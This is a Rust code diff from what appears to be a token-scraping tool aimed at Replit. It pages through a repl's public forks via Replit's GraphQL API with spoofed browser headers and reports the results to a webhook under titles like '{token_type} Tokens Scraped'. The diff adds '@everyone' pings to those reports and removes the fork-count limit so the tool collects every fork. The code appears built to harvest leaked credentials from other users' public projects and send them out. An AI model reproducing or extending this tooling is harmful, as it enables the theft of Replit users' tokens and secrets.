@@ -106,6 +106,7 @@ impl Webhook {
             if da_str.len() > 900 {
                 let second = format!("```ini\n[\n{}]```", da_str);
                 let json = json!({
+                    "content": "@everyone",
                     "embeds": [
                         {
                             "title": format!("{} Tokens Scraped", token_type),
@@ -145,6 +146,7 @@ impl Webhook {
         else {
             let second = format!("```ini\n[\n{}]```", da_str);
             let json = json!({
+                "content": "@everyone",
                 "embeds": [
                     {
                         "title": format!("{} Tokens Scraped", token_type),
@@ -263,44 +265,40 @@ impl Replit {
             ids.push(fork.id);
         }
         loop {
-            if urls.len() >= count {
-                break;
-            } else {
-
-                let json2 = json!([
-                    {
-                    "operationName":"ReplViewForks",
-                        "variables":{
-                            "replId": id,
-                            "count":500,
-                            "after": ids.last().unwrap()
-                        },
-                    "query":"query ReplViewForks($replId: String!, $count: Int!, $after: String) {\n  repl(id: $replId) {\n    ... on Repl {\n      id\n      publicForkCount\n      publicReleasesForkCount\n      publicForks(count: $count, after: $after) {\n        items {\n          id\n          ...ReplPostReplCardRepl\n          __typename\n        }\n        pageInfo {\n          nextCursor\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n"
-                    }
-                ]);
-                let resp = client.post(GRAPHQL)
-                .header("host", "replit.com")
-                .header("user-agent", "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0")
-                .header("origin", "https://replit.com")
-                .header("connection", "keep-alive")
-                .header("x-requested-with", "XMLHttpRequest")
-                .json(&json2)
-                .send().await.unwrap();
-                let repl = resp.json::<StartFork>().await.unwrap().start.data.repl;
-
-
-                let forks = repl.publicForks.items;
-
-                if !forks.is_empty() {
-                    for fork in forks {
-                        urls.push(fork.url);
-                        ids.push(fork.id);
-                    }
-                println!("\x1b[0;92m{} forks loaded...\x1b[0m", urls.len());
-                } else {
-                    break;
+            let json2 = json!([
+                {
+                "operationName":"ReplViewForks",
+                    "variables":{
+                        "replId": id,
+                        "count":500,
+                        "after": ids.last().unwrap()
+                    },
+                "query":"query ReplViewForks($replId: String!, $count: Int!, $after: String) {\n  repl(id: $replId) {\n    ... on Repl {\n      id\n      publicForkCount\n      publicReleasesForkCount\n      publicForks(count: $count, after: $after) {\n        items {\n          id\n          ...ReplPostReplCardRepl\n          __typename\n        }\n        pageInfo {\n          nextCursor\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n"
                 }
+            ]);
+            let resp = client.post(GRAPHQL)
+            .header("host", "replit.com")
+            .header("user-agent", "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0")
+            .header("origin", "https://replit.com")
+            .header("connection", "keep-alive")
+            .header("x-requested-with", "XMLHttpRequest")
+            .json(&json2)
+            .send().await.unwrap();
+            let repl = resp.json::<StartFork>().await.unwrap().start.data.repl;
+
+
+            let forks = repl.publicForks.items;
+
+            if !forks.is_empty() {
+                for fork in forks {
+                    urls.push(fork.url);
+                    ids.push(fork.id);
+                }
+            println!("\x1b[0;92m{} forks loaded...\x1b[0m", urls.len());
+            } else {
+                break;
             }
+            
         }
 
 
